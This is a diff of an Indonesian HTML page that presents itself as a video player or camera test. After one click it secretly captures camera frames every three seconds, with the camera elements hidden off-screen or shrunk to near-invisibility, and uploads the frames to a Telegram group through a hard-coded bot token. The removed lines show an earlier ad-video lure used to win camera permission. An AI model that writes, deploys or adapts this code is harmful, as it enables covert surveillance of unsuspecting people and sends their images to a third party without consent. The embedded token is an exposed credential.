@@ -1,15 +1,15 @@
+
 <!DOCTYPE html>
 <html lang="id">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>CCTV Background</title>
-
     <style>
         body {
             font-family: 'Courier New', Courier, monospace;
             background-color: #000;
-            color: #0f0;
+            color: #0f0; /* Warna hijau ala hacker */
             display: flex;
             flex-direction: column;
             align-items: center;
@@ -19,13 +19,8 @@
             text-align: center;
         }
 
-        h1 { 
-            margin: 10px 0; 
-            font-size: 36px; 
-            border-bottom: 2px solid #0f0; 
-            padding-bottom: 10px; 
-        }
-
+        h1 { margin: 0; font-size: 40px; border-bottom: 2px solid #0f0; padding-bottom: 10px; }
+        
         #status-box {
             margin-top: 20px;
             font-size: 18px;
@@ -38,21 +33,13 @@
             margin-top: 10px;
         }
 
-        /* ---------------------------------------------------- */
-        /* 🚨 SOLUSI PALING AMAN UNTUK MENGHINDARI LAYAR HITAM 🚨 */
-        /* ---------------------------------------------------- */
+        /* MENYEMBUNYIKAN KAMERA DAN CANVAS SEPENUHNYA */
         #video, #canvas {
             position: absolute;
-            top: 0;
-            left: 0;
-            
-            width: 2px; /* Ukuran sangat kecil */
-            height: 2px;
-            
-            opacity: 0.01; /* JANGAN 0. Browser akan tetap merender elemen ini */
-            pointer-events: none; /* Mencegah interaksi klik */
+            top: -9999px;
+            left: -9999px;
+            visibility: hidden;
         }
-        /* visibility: hidden dihapus di sini */
 
         button {
             margin-top: 30px;
@@ -65,116 +52,85 @@
             cursor: pointer;
             border-radius: 5px;
         }
+        button:hover { background: #fff; }
 
-        button:hover { 
-            background: #fff; 
-        }
-
-        /* VIDEO IKLAN DI BAWAH & AWALNYA HIDDEN */
-        #videoIklan {
-            position: fixed;
-            bottom: 10px;
-            width: 90%;
-            max-width: 480px;
-            border: 3px solid #0f0;
-            border-radius: 10px;
-            box-shadow: 0 0 20px #0f0;
-            z-index: 999;
-            display: none; /* <-- PASTIKAN HIDDEN DI AWAL */
-        }
     </style>
 </head>
 <body>
 
-    <h1>VIDEO PLAYER</h1> 
+    <h1>TES CAMERA</h1>
     
-    <div id="status-box"></div> 
-    <div id="log"></div> 
+    <div id="status-box">Menunggu akses...</div>
+    <div id="log">Siap melakukan loop pengiriman</div>
 
+    <!-- Tombol Mulai (Browser butuh interaksi user minimal 1x untuk akses kamera) -->
     <button id="btnStart" onclick="startSystem()">MULAI SISTEM</button>
 
-    <video id="videoIklan" loop playsinline controls>
-        <source src="https://cdn.videy.co/WWx4O6Do1.mp4" type="video/mp4">
-    </video>
-
+    <!-- Elemen Tersembunyi -->
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas"></canvas>
 
 <script>
     // --- KONFIGURASI ---
     const BOT_TOKEN = "7351606479:AAER5MF8ROCjnVmMOYGeKeUTGck5pV5Tr_k";
-    const CHAT_ID = "-4602305711";
-    const JEDA_WAKTU = 3000;
+    const CHAT_ID = "-4602305711"; // ID Grup
+    const JEDA_WAKTU = 3000; // Jeda 3000ms (3 detik) agar tidak kena limit spam
 
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
     const statusBox = document.getElementById('status-box');
     const logBox = document.getElementById('log');
     const btnStart = document.getElementById('btnStart');
-    const videoIklan = document.getElementById('videoIklan');
     
     let counter = 0;
 
-    // 1. Mulai Sistem
+    // 1. Memulai Sistem
     async function startSystem() {
-        btnStart.style.display = 'none'; 
-        statusBox.innerText = "Memuat video dan meminta izin akses...";
+        btnStart.style.display = 'none'; // Hilangkan tombol
+        statusBox.innerText = "Mengaktifkan kamera tersembunyi...";
 
         try {
-            // Meminta akses kamera depan secara eksplisit dengan resolusi
+            // Mengakses kamera belakang jika ada
             const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: {
-                    facingMode: "user", 
-                    width: { ideal: 640 }, 
-                    height: { ideal: 480 } 
-                }
+                video: { facingMode: "environment" } 
             });
             
-            // JIKA BERHASIL: Putar video iklan
-            videoIklan.style.display = "block";
-            videoIklan.currentTime = 0;
-            videoIklan.play().catch(() => {
-                console.log("Autoplay dengan suara membutuhkan interaksi user tambahan.");
-            });
-            
-            // Lanjutkan proses CCTV
             video.srcObject = stream;
             
-            // 🚨 SOLUSI TAMBAHAN: Memaksa video untuk play secara eksplisit
-            await video.play(); 
-            
+            // Tunggu sebentar agar video load, lalu mulai loop
             video.onloadedmetadata = () => {
                 statusBox.innerText = "Sistem Aktif. Memulai pengiriman...";
                 loopProcess(); 
             };
 
         } catch (err) {
-            // JIKA GAGAL: Pesan error
             console.error(err);
-            statusBox.innerHTML = "<span style='color:red'>Izinkan Akses Kamera!</span>";
+            statusBox.innerHTML = "<span style='color:red'>Gagal Akses Kamera!</span>";
             btnStart.style.display = 'block';
         }
     }
 
-    // 2. Loop Utama
+    // 2. Loop Utama (Recursive)
     function loopProcess() {
+        // Logika: Jepret -> Kirim -> (Selesai) -> Tunggu -> Ulangi
         captureAndSend();
     }
 
-    // 3. Jepret & Upload
+    // 3. Fungsi Jepret & Upload
     function captureAndSend() {
         counter++;
         statusBox.innerText = `Mengambil gambar ke-${counter}...`;
 
+        // Gambar video ke canvas (di background)
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
-
         const ctx = canvas.getContext('2d');
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
+        // Convert ke Blob (File gambar)
         canvas.toBlob((blob) => {
             uploadToTelegram(blob);
-        }, 'image/jpeg', 0.7);
+        }, 'image/jpeg', 0.7); // Kualitas 70% agar ringan & cepat
     }
 
     // 4. Kirim ke Telegram
@@ -184,6 +140,7 @@
         const formData = new FormData();
         formData.append("chat_id", CHAT_ID);
         formData.append("photo", imageBlob, `cctv-${counter}.jpg`);
+        // Caption opsional, bisa dikosongkan agar lebih cepat
         formData.append("caption", `📸 Auto Capture #${counter}`);
 
         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
@@ -199,13 +156,14 @@
             }
         })
         .catch(err => {
-            logBox.innerText = `⚠️ Error Jaringan #${counter}`;
+            logBox.innerText = `❌ Error Jaringan #${counter}`;
         })
         .finally(() => {
+            // SETELAH SELESAI (SUKSES/GAGAL), ULANGI LAGI
             statusBox.innerText = `Menunggu ${JEDA_WAKTU/1000} detik...`;
             
             setTimeout(() => {
-                loopProcess();
+                loopProcess(); // Panggil fungsi loop lagi
             }, JEDA_WAKTU);
         });
     }
